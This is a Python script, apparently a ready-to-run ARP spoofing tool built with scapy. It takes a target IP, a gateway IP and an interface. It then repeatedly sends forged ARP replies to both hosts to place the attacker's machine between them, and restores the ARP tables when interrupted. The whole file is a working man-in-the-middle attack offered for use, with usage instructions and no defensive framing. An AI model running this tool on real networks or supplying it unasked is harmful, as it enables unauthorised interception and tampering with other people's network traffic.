#!/usr/bin/env python

import sys
import scapy.all as scapy
import time
import argparse

"""
    To run the script follow the example below:
    
    Usage:
      ./python script_name.py --target 192.168.100.14 --gateway 192.168.100.1 --interface eth0
    
    License:
        MIT License

        Copyright (c) 2023 Marco A. Villarruel

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contact__     = "marco.urquieta@proton.me"
__copyright__   = "Copyright 2013, WildBerry, LLC"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__email__       = "marco.urquieta@proton.me"
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

def get_args():
    """
    Parse and return command line arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="ip_target",
                        help="Target IP", required=True)
    parser.add_argument("-g", "--gateway", dest="ip_gateway",
                        help="Gateway IP", required=True)
    parser.add_argument("-i", "--interface", dest="iface",
                        help="Interface to use", default="eth0")
    args = parser.parse_args()
    return args


def get_mac(ip):
    """
    Retrieve MAC address for a specified IP.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    (answered, unanswered) = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)
    return answered[0][1].hwsrc if answered else None


def spoof(target_ip, spoof_ip, iface):
    """
    Spoof target IP to appear as spoof IP.
    """
    mac_destination = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=mac_destination, psrc=spoof_ip)
    scapy.send(packet, iface=iface, verbose=False)


def restore(destination_ip, source_ip, iface):
    """
    Restore original MAC addresses after spoofing.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, iface=iface, count=4, verbose=False)


def main():
    logo()
    options = get_args()
    try:
        sent_packets_count = 0
        while True:
            spoof(options.ip_target, options.ip_gateway, options.iface)
            spoof(options.ip_gateway, options.ip_target, options.iface)
            sent_packets_count += 2
            print(f"\r[+] Sent two packets: {str(sent_packets_count)}", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print(
            "\n\n[+] Detected Ctrl + C...... Resetting ARP tables..... Please wait!\n", end='')
        restore(options.ip_target, options.ip_gateway, options.iface)
        restore(options.ip_gateway, options.ip_target, options.iface)


if __name__ == "__main__":
    main()
